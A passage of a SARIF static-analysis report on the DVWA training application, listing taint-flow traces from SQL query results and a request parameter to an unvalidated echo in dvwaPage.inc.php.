                "text" : "high.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4564",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "7C356B7638204790DAB2BE039DC07346"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 26
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:30 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - explode(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:12 - Assignment to $octet"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 12
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:17 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/impossible.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:26 - shell_exec(0 : return)"
              },
